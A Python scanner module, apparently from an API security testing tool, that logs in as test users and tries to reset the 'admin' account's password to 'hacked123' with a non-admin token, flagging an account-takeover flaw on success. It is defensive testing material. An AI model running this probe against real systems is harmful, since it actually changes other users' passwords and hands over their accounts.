#!/usr/bin/env python3
"""
Unauthorized Password Change (Account Takeover) Test Script
Checks if an API endpoint is vulnerable to unauthorized password changes
by attempting to modify another user's password using a non-admin token.
"""

import requests
from typing import Dict, List, Optional, Any
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger
import uuid

class UnauthorizedPasswordChangeScanner(BaseScanner):
    @staticmethod
    def scan(url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        scanner = UnauthorizedPasswordChangeScanner()
        logger = setup_scanner_logger("unauthorized_password_change")
        vulnerabilities = []
        
        # Store context if provided
        if context:
            scanner.context = context
        
        # Use tokens from other scanners if available
        existing_tokens = []
        if tokens and 'bearer' in tokens:
            existing_tokens = [t.get('token') for t in tokens.get('bearer', [])]
        
        # Test credentials
        test_users = [
            {"username": "test1", "password": "test1"},
            {"username": "test2", "password": "test2"}
        ]
        
        # Check if we have credentials in context
        if context and 'credentials' in context:
            test_users.extend(context['credentials'])
        
        # Track dependencies for findings
        dependencies = []
        if context and 'finding_ids' in context:
            dependencies = context['finding_ids']
        
        for user in test_users:
            try:
                correlation_id = str(uuid.uuid4())
                auth_state = {"test_user": user["username"], "auth_type": "basic"}
                
                # Login to get auth token
                login_url = f"{url}/users/v1/login"
                login_resp = requests.post(
                    login_url,
                    json=user,
                    timeout=5
                )
                
                if login_resp.status_code != 200:
                    continue
                    
                auth_token = login_resp.json().get("auth_token")
                if not auth_token:
                    continue
                
                # Update auth state with token info
                auth_state["auth_token"] = auth_token
                auth_state["auth_type"] = "bearer"
                
                # Capture login transaction
                login_req, login_res = scanner.capture_transaction(
                    login_resp,
                    auth_state=auth_state,
                    correlation_id=correlation_id
                )
                
                # Update context with discovered token
                scanner.update_context({
                    'discovered_tokens': [auth_token],
                    'auth_state': auth_state
                })
                    
                # Try to change another user's password
                target_username = "admin"
                new_password = "hacked123"
                
                change_url = f"{url}/users/v1/{target_username}/password"
                request_headers = headers or {}
                request_headers["Authorization"] = f"Bearer {auth_token}"
                payload = {"password": new_password}
                
                change_resp = requests.put(
                    change_url,
                    headers=request_headers,
                    json=payload,
                    timeout=5
                )
                
                # Capture password change transaction
                change_req, change_res = scanner.capture_transaction(
                    change_resp,
                    auth_state=auth_state,
                    correlation_id=correlation_id
                )
                
                if change_resp.status_code == 204:
                    finding = {
                        "type": "UNAUTHORIZED_PASSWORD_CHANGE",
                        "severity": "HIGH",
                        "detail": f"Successfully changed password for user {target_username} using non-admin token",
                        "evidence": {
                            "login_request": login_req,
                            "login_response": login_res,
                            "change_request": change_req,
                            "change_response": change_res,
                            "auth_state": auth_state,
                            "correlation_id": correlation_id
                        },
                        "dependencies": dependencies
                    }
                    vulnerabilities.append(finding)
                    
            except requests.RequestException as e:
                logger.error(f"Error in unauthorized password change check: {str(e)}")
                
        return vulnerabilities

scan = UnauthorizedPasswordChangeScanner.scan
